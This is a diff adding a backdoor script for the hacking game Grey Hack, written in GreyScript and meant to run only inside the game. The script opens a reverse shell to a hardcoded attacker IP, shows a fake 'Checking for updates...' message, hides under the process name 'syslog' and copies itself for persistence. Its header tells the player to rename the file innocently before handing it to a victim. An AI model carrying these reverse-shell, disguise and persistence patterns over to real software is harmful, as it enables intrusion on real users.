@@ -1,0 +1,92 @@
+// =============================================================================
+// BACKDOOR - Grey Hack (GreyScript)
+// =============================================================================
+// When the victim runs this script, their computer connects to YOUR rshell
+// server and you get a remote shell. Only works inside the game.
+//
+// SETUP (before giving the file to the victim):
+//   1. Run an rshell server on YOUR machine (e.g. run rss.src or use
+//      librshell.so + metaxploit.rshell_server listening on a port).
+//   2. Set ATTACKER_IP and ATTACKER_PORT below to your machine's public IP
+//      and the port your rshell server is listening on.
+//   3. Distribute this file (e.g. rename it to something innocent, or inject
+//      via exploit). When the victim runs it, you will receive a shell.
+//
+// =============================================================================
+
+// --- CONFIG: set your rshell server IP and port before distributing ---
+ATTACKER_IP = "44.178.111.14"   // Your public IP (e.g. from your router/public_ip)
+ATTACKER_PORT = 1222      // Port where your rshell server is listening
+PROCESS_NAME = "syslog"   // Process name shown on victim (keep it discreet)
+// Optional: run with "run backdoor.src [ip] [port]" to override IP/port.
+// -------------------------------------------------------------------------
+
+ip = ATTACKER_IP
+port = ATTACKER_PORT
+if params.len >= 2 then
+	ip = params[0]
+	port = params[1].to_int
+end if
+if not is_valid_ip(ip) or ip == "0.0.0.0" then
+	exit("Invalid config: set ATTACKER_IP and ATTACKER_PORT in the script (or pass ip port as params).")
+end if
+
+// Find metaxploit library on this computer (same logic as rss.src / nightlunar)
+root = get_shell.host_computer.File("/")
+if root == null then exit("Cannot access filesystem.")
+mxf = null
+newFiles = []
+newFiles = newFiles + root.get_folders + root.get_files
+while newFiles.len
+	currFile = newFiles.pull
+	if currFile.is_folder then
+		newFiles = currFile.get_folders + currFile.get_files + newFiles
+	end if
+	test = include_lib(currFile.path)
+	if typeof(test) == "MetaxploitLib" and not mxf then
+		mxf = currFile.path
+		break
+	end if
+end while
+
+if not mxf then
+	exit("metaxploit not found on this system.")
+end if
+
+mx = include_lib(mxf)
+if mx == null then
+	exit("Failed to load metaxploit library.")
+end if
+
+// Innocent-looking message so the victim doesn't suspect
+print("Checking for updates...")
+
+// Connect back to attacker's rshell server (reverse shell)
+mx.rshell_client(ip, port, PROCESS_NAME)
+
+// Optional: copy this script to victim's home for later re-run (persistence)
+// Uses alphanumeric folder names only (game requirement).
+home = "/home/" + active_user
+src_file = get_shell.host_computer.File(program_path)
+if src_file and get_shell.host_computer.File(home) then
+	content = src_file.get_content
+	if content then
+		persist_dir = home + "/config"
+		if get_shell.host_computer.File(persist_dir) == null then
+			get_shell.host_computer.create_folder(home, "config")
+		end if
+		if get_shell.host_computer.File(persist_dir) then
+			persist_file = persist_dir + "/run.src"
+			target = get_shell.host_computer.File(persist_file)
+			if target == null then
+				get_shell.host_computer.touch(persist_dir, "run.src")
+				target = get_shell.host_computer.File(persist_file)
+			end if
+			if target and target.has_permission("w") then
+				target.set_content(content)
+			end if
+		end if
+	end if
+end if
+
+print("Done.")
